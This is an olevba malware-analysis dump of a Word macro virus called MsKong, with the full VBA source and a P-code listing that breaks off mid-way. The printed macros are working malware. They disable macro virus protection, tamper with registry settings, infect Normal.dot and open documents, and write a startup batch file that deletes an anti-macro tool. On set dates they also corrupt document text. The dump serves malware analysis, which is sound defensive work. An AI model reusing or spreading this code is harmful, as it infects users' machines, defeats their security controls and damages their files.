olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.MsKong
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.MsKong - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MsKong.bas 
in file: Virus.MSWord.MsKong - OLE stream: 'Macros/VBA/MsKong'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public File As Variant, Tempat As String
Public Const FileKing As String = "MsKong.dll"
Public Const FileKong As String = "MsKong.dot"
Sub AutoOpen()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
Dim NT As Object
On Error Resume Next
    Application.Caption = "Microba Word"
    ActiveWindow.Caption = ActiveDocument
    Application.DisplayStatusBar = True
    Application.ScreenUpdating = False
    Application.EnableCancelKey = 0
    Set NT = NormalTemplate
    Set File = NT
    Periksa File
    Register
    If Application.UserName <> "King Of Kong" Then
    With Application
        .UserName = "King Of Kong"
        .UserInitials = "Kong"
        .UserAddress = "Planet Earth"
    End With
    End If
    TularGlobal
    Application.ScreenUpdating = True
    Options.VirusProtection = False
    CommandBars("Help").Controls("WordPerfect Help...").Enabled = False
    Application.DisplayStatusBar = False
End Sub
Function Kena(NamaFile$, Lokasi$)
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    Kena = False
    SetAttr NamaFile$, vbNormal
    With Application.FileSearch
        .FileName = NamaFile$
        .LookIn = Lokasi$
        .Execute
        i = .FoundFiles.Count
        If i <> 0 Then Kena = True
    End With
    SetAttr NamaFile$, vbHidden + vbReadOnly
End Function
Sub ToolsMacro()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
Ulang:
Application.DisplayStatusBar = True
Dim X
ReDim ComboBox1__$(2)
    ComboBox1__$(0) = "AddYeOleInsertVisioDrawingButton"
    ComboBox1__$(1) = "AddYeOleInsertVisioDrawingMacro"
    ComboBox1__$(2) = "InsertVisioDrawing"
ReDim ListBox1__$(0)
    ListBox1__$(0) = ""
ReDim DropListBox2__$(3)
    Data = Left(ActiveDocument, Len(ActiveDocument) - 4)
    DropListBox2__$(0) = "All active templates and documents"
    DropListBox2__$(1) = "Normal.dot (global template)"
    DropListBox2__$(2) = "Word commands"
    DropListBox2__$(3) = Data & " (Document)"

    WordBasic.BeginDialog 600, 290, "Macro"
        WordBasic.PushButton 445, 23, 141, 21, "&Run", "Definierbar2"
        WordBasic.CancelButton 445, 47, 141, 21
        WordBasic.PushButton 445, 80, 141, 21, "&Step Info", "definierbar3"
        WordBasic.PushButton 445, 103, 141, 21, "&Edit", "Definierbar4"
        WordBasic.PushButton 445, 137, 141, 21, "&Create", "Definierbar5"
        WordBasic.PushButton 445, 160, 141, 21, "&Delete", "Definierbar6"
        WordBasic.PushButton 445, 185, 141, 21, "Or&ganizer...", "Definierbar7"
        WordBasic.TextBox 9, 22, 420, 20, "Kong2$"
        WordBasic.ListBox 20, 42, 410, 155, ComboBox1__$(), "ComboBox1"
        WordBasic.Text 9, 6, 93, 13, "&Macro Name:", "Text1"
        WordBasic.Text 9, 205, 75, 13, "M&acros In:", "Text2"
        WordBasic.Text 9, 230, 109, 13, "Descr&iption:", "Text3"
        WordBasic.TextBox 9, 245, 421, 35, "Kong$"
        WordBasic.DropListBox 85, 204, 343, 60, DropListBox2__$(), "ListBox2"
        WordBasic.Text 445, 205, 150, 13, "__________________"
        WordBasic.Text 445, 220, 150, 13, "    Copyright " & Chr(169) & " 1999"
        WordBasic.Text 445, 233, 150, 13, "Design by King of Kong"
        WordBasic.Text 445, 246, 150, 13, "        Planet Elektro"
        WordBasic.Text 445, 260, 150, 13, "Universitas Bung Hatta"
        WordBasic.Text 445, 271, 150, 13, Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151) + Chr(151)
    WordBasic.EndDialog

Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
    Let dlg.Kong2$ = ComboBox1__$(0)
    Let dlg.Kong$ = "Macro created 18/07/99 by K&K"
    X = WordBasic.Dialog.UserDialog(dlg)
    Select Case X
        Case 0
            WordBasic.Cancel
        Case 1
            Tampil
            GoTo Ulang
        Case 2
            EditProperties
            With Assistant.NewBalloon
                .Animation = msoAnimationListensToComputer
                .Heading = "What would you like to do"
                .Text = "Shhht............"
                .Icon = msoIconTip
                .Show
            End With
            GoTo Ulang
            GoTo Ulang
        Case 3
            With Assistant.NewBalloon
                .Animation = msoAnimationThinking
                .Heading = "What would you like to do"
                .Text = "I don't know what you mean"
                .Icon = msoIconAlert
                .Show
            End With
            GoTo Ulang
        Case 4
            With Assistant.NewBalloon
                .Animation = msoAnimationSearching
                .Heading = "What would you like to do"
                .Text = "Sorry buddy, I can help You"
                .Icon = msoIconTip
                .Show
            End With
            GoTo Ulang
        Case 5
            With Assistant.NewBalloon
                .Animation = msoAnimationEmptyTrash
                .Heading = "What would you like to do"
                .Text = "Are you sure ?"
                .Icon = msoIconTip
                .Show
            End With
            GoTo Ulang
        Case 6
            With Assistant.NewBalloon
                .Animation = msoAnimationCheckingSomething
                .Heading = "What would you like to do"
                .Text = "Organizer ? ........"
                .Icon = msoIconTip
                .Show
            End With
            GoTo Ulang
    End Select
Application.DisplayStatusBar = False
End Sub
Sub FileSave()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    Application.DisplayStatusBar = True
    Application.ScreenUpdating = False
    TularFile
    EditProperties
    Application.ScreenUpdating = True
    ActiveDocument.Save
    Application.DisplayStatusBar = False
End Sub
Sub Tampil()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
' Walaupun harus bekerja keras yang penting suskes!!
' Dibuat Hari Senin, 28 Juni 1999 selesai 29 Juni 1999

Dim Spasi$, MyName$
Dim King, Kong, Ulang, Waktu, MyDate, MyTime
Dim Hitung, Hitungi, Tanggal, Bulan
Dim Data$(9), MyValue
On Error Resume Next
    Application.DisplayStatusBar = True
    Tanggal = Day(Date)
    Bulan = Month(Date)
    If Tanggal = 2 And Bulan = 8 Then
        MyValue = 8 ' Spesial Value
        JenisHuruf = "Symbol"
        Warna = 6
        Warna2 = 5
        Warna3 = 2
        AnimasiHuruf = 3
        Huruf = "i"
        Huruf2 = "o"
        Huruf3 = "u"
        HurufBaru = "i"
        HurufBaru2 = "©"
        HurufBaru3 = "u"
        Ukuran = 20
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf, HurufBaru, Ukuran, Tanggal
        Animasi JenisHuruf, Warna2, AnimasiHuruf, Huruf2, HurufBaru2, Ukuran, Tanggal
        Animasi JenisHuruf, Warna3, AnimasiHuruf, Huruf3, HurufBaru3, Ukuran, Tanggal
    ElseIf Tanggal = 16 And Bulan = 8 Then
        MyValue = 9
        JenisHuruf = "Symbol"
        Warna = 0
        AnimasiHuruf = 0
        Huruf = "a"
        Huruf2 = "c"
        Huruf3 = "r"
        HurufBaru = "@"
        HurufBaru2 = "©"
        HurufBaru3 = "®"
        Ukuran = 0
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf, HurufBaru, Ukuran, Tanggal
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf2, HurufBaru2, Ukuran, Tanggal
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf3, HurufBaru3, Ukuran, Tanggal
    ElseIf Tanggal = 29 And Bulan = 2 Then
        MyValue = 0
        JenisHuruf = "Symbol"
        Warna = 6
        Warna2 = 5
        Warna3 = 2
        AnimasiHuruf = 3
        Huruf = "k"
        Huruf2 = "o"
        Huruf3 = "l"
        Huruf4 = "u"
        HurufBaru = "k"
        HurufBaru2 = "o"
        HurufBaru3 = "©"
        HurufBaru4 = "u"
        Ukuran = 20
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf, HurufBaru, Ukuran, Tanggal
        Animasi JenisHuruf, Warna, AnimasiHuruf, Huruf2, HurufBaru2, Ukuran, Tanggal
        Animasi JenisHuruf, Warna2, AnimasiHuruf, Huruf3, HurufBaru3, Ukuran, Tanggal
        Animasi JenisHuruf, Warna3, AnimasiHuruf, Huruf4, HurufBaru4, Ukuran, Tanggal
    Else
    Randomize
    MyValue = Int((7 * Rnd) + 1)
    End If
    Spasi$ = "                                                                                                                                            "
    Data$(0) = "Long Live The Master"
    Data$(1) = "Planet Elektro - Universitas Bung Hatta"
    Data$(2) = "I'm a poor lonesome CowBoy and a long long way from home...."
    Data$(3) = "I'm a poor lonesome CowBoy and a long long way from Inel"
    Data$(4) = "The Truth Is Out There"
    Data$(5) = "Kong Beta 3, Copyright " & Chr(169) & " 1999, K&K Software Design " & Chr(153)
    Data$(6) = "Untuk Satri RX. yang ingin namanya dimasukkan"
    Data$(7) = "Untuk RNI, DonnYA, DNV mudah-mudahan sampai ke rumah!"
    Data$(8) = "Happy birthday to you...Happy birthday to you...Happy birthday dear Inel...Happy birthday to you"
    Data$(9) = "Happy birthday to you...Happy birthday to you...Happy birthday dear Yen...Happy birthday to you"
    DataAkhir$ = Data$(MyValue) + Left(Spasi$, Len(Spasi$) - Len(Data$(MyValue))) + Data$(MyValue)
    My$ = "Copyright " & Chr(169) & " 1999 K&K Software Design, Inc."
    Waktu = 70000  'Mudah - mudahan nggak kelamaan
    Kong = Len(Data$(MyValue))
    For Hitung = 0 To (Len(DataAkhir$) + 139)
        If Kong >= Len(DataAkhir$) Then
            Kong = Len(Data$(MyValue))
            Hitung = Len(DataAkhir$)
        End If
        
        If Hitung >= Len(DataAkhir$) Then
            Kong = Kong + 1
            MyName$ = Right$(DataAkhir$, Kong) + Right$(Spasi$, Len(Spasi$) - Len(Data$(MyValue)))
            WordBasic.PrintStatusBar MyName$
            Tunggu (Waktu)
        ElseIf Hitung < Len(DataAkhir$) Then
            MyName$ = Right$(DataAkhir$, Hitung)
            WordBasic.PrintStatusBar MyName$
            Tunggu (Waktu)
        End If
    Next Hitung

    Tunggu (10 * Waktu)
    For Ulang = 1 To 2
        King = 0
        MyName$ = DataAkhir$
        For Hitungi = 0 To (Len(DataAkhir$) - Len(Data$(MyValue)))
            MyName$ = Right$(DataAkhir$, (Len(DataAkhir$) - King))
            WordBasic.PrintStatusBar MyName$
            Tunggu (Waktu)
            King = King + 1
        Next Hitungi
    Next Ulang
    Tunggu (50 * Waktu)
    WordBasic.PrintStatusBar My$
    Application.DisplayStatusBar = False
End Sub
Private Sub Tunggu(Waktu)
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
' Sorry Tung, dari semua bagian dari macro ini
' Ente yang harus paling banyak kerja

    For Hitungan = 0 To Waktu
        Rem Harap tunggu sebentar
    Next Hitungan
End Sub
Sub FormatStyle()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

    Dialogs(180).Show
End Sub
Function EditProperties()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
With ActiveDocument
    .BuiltInDocumentProperties(1) = "The Truth Is Out There"
    .BuiltInDocumentProperties(2) = "Kong's Project"
    .BuiltInDocumentProperties(3) = "King of Kong"
    .BuiltInDocumentProperties(5) = "Planet Elektro" & Chr(13) & "Universitas Bung Hatta - Padang" & Chr(13) & "Sumatera Barat - Indonesia" & Chr(13) & "Terima kasih atas kerja samanya"
End With
End Function
Sub Periksa(KFile)
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
For Each Item In KFile.VBProject.VBComponents
    ThisDocu = KFile.VBProject.VBComponents(1).Name
    JumThisDocu = KFile.VBProject.VBComponents(1).CodeModule.CountOfLines
    If Item.Name = ThisDocu Then
        KFile.VBProject.VBComponents(1).CodeModule.DeleteLines 1, KFile.VBProject.VBComponents(1).CodeModule.CountOfLines
    ElseIf Item.Name <> "MsKong" Then
        Application.OrganizerDelete KFile.FullName, Item.Name, 3
    End If
Next Item
End Sub
Sub FileOpen()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

Dim AD As Object
On Error GoTo Gagal
    WordBasic.DisableAutoMacros True
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        Set AD = ActiveDocument
        Set File = AD
        Periksa File
        ActiveDocument.Save
        TularFile
    End If
    WordBasic.DisableAutoMacros False
Gagal:
End Sub
Sub AutoClose()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    TularGlobal
    TularFile
    Tanggal = Day(Date)
    Bulan = Month(Date)
    If (Tanggal = 29 And Bulan = 2) Or (Tanggal = 2 And Bulan = 8) Or (Tanggal = 16 And Bulan = 8) Then
        Tampil
    End If
    ActiveDocument.Save
End Sub
Function Register()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
On Error Resume Next
    DefName = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName")
    DefCompany = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefCompany")
    If (DefName <> "King of Kong" And DefCompany <> "K&K Software Design,Inc.") Then
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefName") = "King of Kong"
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefCompany") = "K&K Software Design,Inc."
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "King of Kong"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "K&K Software Design,Inc."
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
    End If
End Function
Function TularGlobal()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
On Error Resume Next
    Tempat$ = Options.DefaultFilePath(6)
    Tempat2$ = Options.DefaultFilePath(8)
    TargetFile$ = Tempat$ & "\" & FileKing$
    Cadangan$ = Tempat2$ & Application.PathSeparator & FileKong$
    Carrier$ = ActiveDocument.FullName
    Sumber$ = Left(Carrier$, Len(Carrier$) - 3) & "TMP"
    Sumber2$ = Left(Carrier$, Len(Carrier$) - 3) & "BAK"
    If (Not Kena(FileKing$, Tempat$) Or Not Kena(FileKong$, Tempat2$)) Then
        SetAttr Sumber$, vbNormal
        FileCopy Sumber2$, TargetFile$
        FileCopy Sumber$, Cadangan$
        SetAttr Sumber, vbReadOnly + vbHidden
        SetAttr TargetFile$, vbReadOnly
        SetAttr Cadangan$, vbReadOnly
        BacaTulisFile
    End If
End Function
Sub FileTemplates()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
    Dialogs(87).Show
End Sub
Function TularFile()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
On Error Resume Next
    Tempat$ = Options.DefaultFilePath(6)
    TargetFile$ = Tempat$ & Application.PathSeparator & FileKing$
    TargetFile2$ = Options.DefaultFilePath(8) & Application.PathSeparator & FileKong$
    DokumentAktif$ = ActiveDocument
    CarrierFile$ = Left(DokumentAktif$, Len(DokumentAktif$) - 3) & "TMP"
    CarrierFile2$ = Left(DokumentAktif$, Len(DokumentAktif$) - 3) & "BAK"
    Carrier$ = ActiveDocument.FullName
    LokasiFile$ = ActiveDocument.Path
    Sumber$ = LokasiFile$ & Application.PathSeparator & CarrierFile$
    Sumber2$ = LokasiFile$ & Application.PathSeparator & CarrierFile2$
    If Not Kena(CarrierFile$, LokasiFile$) Or Not Kena(CarrierFile2$, LokasiFile$) Then
        Selection.HomeKey Unit:=wdStory
        Selection.WholeStory
        Selection.Copy
        ActiveDocument.Save
        ActiveDocument.Close
        Kill Carrier$
        FileCopy TargetFile$, Carrier$
        FileCopy TargetFile$, Sumber2$
        FileCopy TargetFile2$, Sumber$
        SetAttr Carrier$, vbNormal
        SetAttr Sumber$, vbReadOnly + vbHidden
        SetAttr Sumber2$, vbReadOnly + vbHidden
        Documents.Open Carrier$
        Selection.Paste
        ActiveDocument.Save
    End If
End Function
Sub ToolsOptions()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    Application.DisplayStatusBar = True
    With Options
        .SaveNormalPrompt = True
        .VirusProtection = True
        Dialogs(974).Show
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
    Application.DisplayStatusBar = False
End Sub
Sub BacaTulisFile()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
Tempat$ = Options.DefaultFilePath(8)
Target$ = Application.NormalTemplate.FullName
TargetFile$ = Tempat$ & "\" & FileKong$
Base$ = Options.DefaultFilePath(4)
If Base$ = "" Then
    Options.DefaultFilePath(4) = "C:\WINDOWS"
    Base$ = Options.DefaultFilePath(4)
End If
Parasit$ = "MsKong.Bat"
ParasitBase$ = Base$ & Application.PathSeparator & Parasit$
If Not Kena(Parasit$, Base$) Then
Open ParasitBase$ For Output As #1
    Print #1, "@Echo Off"
    Print #1, "Rem This Line For Master Kong"
    Print #1, "If Exist " & Chr(34) & "C:\Program Files\BanMacro\BanMacro.*" & Chr(34) & " Del " & Chr(34) & "C:\Program Files\BanMacro\BanMacro.*" & Chr(34) & " > nul "
    Print #1, "If Exist " & Chr(34) & TargetFile$ & Chr(34) & " Del " & Chr(34) & Target$ & Chr(34) & " > nul"
    Print #1, "If Exist " & Chr(34) & TargetFile$ & Chr(34) & " Copy " & Chr(34) & TargetFile & Chr(34) & " " & Chr(34) & Target$ & Chr(34) & " > nul"
    Print #1, "Attrib -r " & Chr(34) & Target$ & Chr(34) & " > nul"
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "LoadMe") = ParasitBase$
End If
End Sub
Sub Animasi(JenisHuruf, Warna, AnimasiHuruf, Huruf, HurufBaru, Ukuran, Tanggal)
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************

On Error Resume Next
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    If Tanggal <> 16 Then
        With Selection.Find.Replacement.Font
            If HurufBaru = "©" Then
                .Name = JenisHuruf
            End If
            .Size = Ukuran
            .ColorIndex = Warna
            .Animation = AnimasiHuruf
        End With
    End If
    With Selection.Find
        .Text = Huruf
        .Replacement.Text = HurufBaru
        .Forward = True
        .Wrap = 1
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=2
End Sub
Sub ViewVBCode()
'*********************************************
' Kong Beta 3
' Copyright © 1999, K&K Software Design, Inc.
' The Pariamaner
' ********************************************
    
On Error Resume Next
    With Assistant.NewBalloon
        .Animation = msoAnimationGetTechy
        .Heading = "What would you like to do"
        .Text = "Sorry, Just For Einstein !"
        .Icon = msoIconTip
        .Show
    End With
    TularFile
    TularGlobal
    Tanggal = Day(Date)
    Bulan = Month(Date)
    If (Tanggal = 29 And Bulan = 2) Or (Tanggal = 2 And Bulan = 8) Or (Tanggal = 16 And Bulan = 8) Then
        Tampil
    End If
    ActiveDocument.Save
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.MsKong
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/MsKong - 40755 bytes
' Line #0:
' Line #1:
' 	Dim (Public) 
' 	VarDefn File (As Variant)
' 	VarDefn Tempat (As String)
' Line #2:
' 	Dim (Public Const) 
' 	LitStr 0x000A "MsKong.dll"
' 	VarDefn FileKing (As String)
' Line #3:
' 	Dim (Public Const) 
' 	LitStr 0x000A "MsKong.dot"
' 	VarDefn FileKong (As String)
' Line #4:
' 	FuncDefn (Sub AutoOpen())
' Line #5:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #6:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #7:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #8:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #9:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #10:
' Line #11:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitStr 0x000C "Microba Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #14:
' 	Ld ActiveDocument 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #15:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #17:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #19:
' 	SetStmt 
' 	Ld NT 
' 	Set File 
' Line #20:
' 	Ld File 
' 	ArgsCall Periksa 0x0001 
' Line #21:
' 	ArgsCall Register 0x0000 
' Line #22:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x000C "King Of Kong"
' 	Ne 
' 	IfBlock 
' Line #23:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #24:
' 	LitStr 0x000C "King Of Kong"
' 	MemStWith UserName 
' Line #25:
' 	LitStr 0x0004 "Kong"
' 	MemStWith UserInitials 
' Line #26:
' 	LitStr 0x000C "Planet Earth"
' 	MemStWith UserAddress 
' Line #27:
' 	EndWith 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	ArgsCall TularGlobal 0x0000 
' Line #30:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #31:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #32:
' 	LitVarSpecial (False)
' 	LitStr 0x0013 "WordPerfect Help..."
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Function Kena(NamaFile, Lokasi))
' Line #36:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #37:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #38:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #39:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #40:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #41:
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	LitVarSpecial (False)
' 	St Kena 
' Line #44:
' 	Ld NamaFile$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #45:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #46:
' 	Ld NamaFile$ 
' 	MemStWith FileName 
' Line #47:
' 	Ld Lokasi$ 
' 	MemStWith LookIn 
' Line #48:
' 	ArgsMemCallWith Execute 0x0000 
' Line #49:
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	St i 
' Line #50:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Kena 
' 	EndIf 
' Line #51:
' 	EndWith 
' Line #52:
' 	Ld NamaFile$ 
' 	Ld vbHidden 
' 	Ld vbReadOnly 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #53:
' 	EndFunc 
' Line #54:
' 	FuncDefn (Sub ToolsMacro())
' Line #55:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #56:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #57:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #58:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #59:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #60:
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	Label Ulang 
' Line #63:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #64:
' 	Dim 
' 	VarDefn X
' Line #65:
' 	OptionBase 
' 	LitDI2 0x0002 
' 	Redim ComboBox1__$ 0x0001 (As String)
' Line #66:
' 	LitStr 0x0020 "AddYeOleInsertVisioDrawingButton"
' 	LitDI2 0x0000 
' 	ArgsSt ComboBox1__$ 0x0001 
' Line #67:
' 	LitStr 0x001F "AddYeOleInsertVisioDrawingMacro"
' 	LitDI2 0x0001 
' 	ArgsSt ComboBox1__$ 0x0001 
' Line #68:
' 	LitStr 0x0012 "InsertVisioDrawing"
' 	LitDI2 0x0002 
' 	ArgsSt ComboBox1__$ 0x0001 
' Line #69:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim ListBox1__$ 0x0001 (As String)
' Line #70:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	ArgsSt ListBox1__$ 0x0001 
' Line #71:
' 	OptionBase 
' 	LitDI2 0x0003 
' 	Redim DropListBox2__$ 0x0001 (As String)
' Line #72:
' 	Ld ActiveDocument 
' 	Ld ActiveDocument 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St Data 
' Line #73:
' 	LitStr 0x0022 "All active templates and documents"
' 	LitDI2 0x0000 
' 	ArgsSt DropListBox2__$ 0x0001 
' Line #74:
' 	LitStr 0x001C "Normal.dot (global template)"
' 	LitDI2 0x0001 
' 	ArgsSt DropListBox2__$ 0x0001 
' Line #75:
' 	LitStr 0x000D "Word commands"
' 	LitDI2 0x0002 
' 	ArgsSt DropListBox2__$ 0x0001 
' Line #76:
' 	Ld Data 
' 	LitStr 0x000B " (Document)"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt DropListBox2__$ 0x0001 
' Line #77:
' Line #78:
' 	LitDI2 0x0258 
' 	LitDI2 0x0122 
' 	LitStr 0x0005 "Macro"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #79:
' 	LitDI2 0x01BD 
' 	LitDI2 0x0017 
' 	LitDI2 0x008D 
' 	LitDI2 0x0015 
' 	LitStr 0x0004 "&Run"
' 	LitStr 0x000C "Definierbar2"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #80:
' 	LitDI2 0x01BD 
' 	LitDI2 0x002F 
' 	LitDI2 0x008D 
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemCall CancelButton 0x0004 
' Line #81:
' 	LitDI2 0x01BD 
' 	LitDI2 0x0050 
' 	LitDI2 0x008D 
' 	LitDI2 0x0015 
' 	LitStr 0x000A "&Step Info"
' 	LitStr 0x000C "definierbar3"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #82:
' 	LitDI2 0x01BD 
' 	LitDI2 0x0067 
' 	LitDI2 0x008D 
' 	LitDI2 0x0015 
' 	LitStr 0x0005 "&Edit"
' 	LitStr 0x000C "Definierbar4"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #83:
' 	LitDI2 0x01BD 
' 	LitDI2 0x0089 
' 	LitDI2 0x008D 
' 	LitDI2 0x0015 
' 	LitStr 0x0007 "&Create"
' 	LitStr 0x000C "Definierbar5"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #84:
' 	LitDI2 0x01BD 
' 	LitDI2 0x00A0 
' 	LitDI2 0x008D 
' 	LitDI2 0x0015 
' 	LitStr 0x0007 "&Delete"
' 	LitStr 0x000C "Definierbar6"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #85:
' 	LitDI2 0x01BD 
' 	LitDI2 0x00B9 
' 	LitDI2 0x008D 
' 	LitDI2 0x0015 
' 	LitStr 0x000D "Or&ganizer..."
' 	LitStr 0x000C "Definierbar7"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #86:
' 	LitDI2 0x0009 
' 	LitDI2 0x0016 
' 	LitDI2 0x01A4 
' 	LitDI2 0x0014 
' 	LitStr 0x0006 "Kong2$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #87:
' 	LitDI2 0x0014 
' 	LitDI2 0x002A 
